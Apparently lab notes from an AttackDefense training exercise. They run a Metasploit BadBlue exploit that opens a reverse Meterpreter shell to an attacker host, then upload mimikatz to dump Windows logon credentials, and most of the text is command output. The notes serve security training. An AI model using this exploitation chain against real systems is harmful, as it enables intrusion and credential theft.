...
- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
...
Target IP Address : 10.5.30.75
root@attackdefense:~# ping -c 5 10.5.30.75
PING 10.5.30.75 (10.5.30.75) 56(84) bytes of data.
64 bytes from 10.5.30.75: icmp_seq=1 ttl=125 time=2.24 ms
64 bytes from 10.5.30.75: icmp_seq=2 ttl=125 time=1.79 ms
64 bytes from 10.5.30.75: icmp_seq=3 ttl=125 time=1.83 ms
64 bytes from 10.5.30.75: icmp_seq=4 ttl=125 time=1.91 ms
64 bytes from 10.5.30.75: icmp_seq=5 ttl=125 time=1.93 ms

--- 10.5.30.75 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.786/1.938/2.237/0.157 ms
```

[[Hack2.0/NMAP#Service version|NMAP]]

```
root@attackdefense:~# nmap -sV 10.5.30.75
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-18 20:17 IST
Nmap scan report for 10.5.30.75
...
msf6 exploit(windows/http/badblue_passthru) > set rhosts 10.5.30.75
rhosts => 10.5.30.75
msf6 exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 10.10.26.4:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.5.30.75
[*] Meterpreter session 1 opened (10.10.26.4:4444 -> 10.5.30.75:49898) at 2023-07-18 20:20:43 +0530
...
Uploading the mimikatz.exe to windows using meterpreter and exploiting on Windows.
...
07/18/2023  03:01 PM    <DIR>          .
07/18/2023  03:01 PM    <DIR>          ..
07/18/2023  03:01 PM         1,309,448 mimikatz.exe
               1 File(s)      1,309,448 bytes
               2 Dir(s)  15,951,126,528 bytes free
...
Authentication Id : 0 ; 2349156 (00000000:0023d864)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/18/2023 2:44:18 PM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
...
Authentication Id : 0 ; 2348798 (00000000:0023d6fe)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
...
Authentication Id : 0 ; 147826 (00000000:00024172)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 7/18/2023 2:43:07 PM
...
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 7/18/2023 2:43:00 PM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
...
Authentication Id : 0 ; 2347685 (00000000:0023d2a5)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
...
Authentication Id : 0 ; 58691 (00000000:0000e543)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
...
Authentication Id : 0 ; 58673 (00000000:0000e531)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
...
Authentication Id : 0 ; 28198 (00000000:00006e26)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/18/2023 2:42:59 PM
SID               : 
	msv :	
	tspkg :	
	wdigest :	
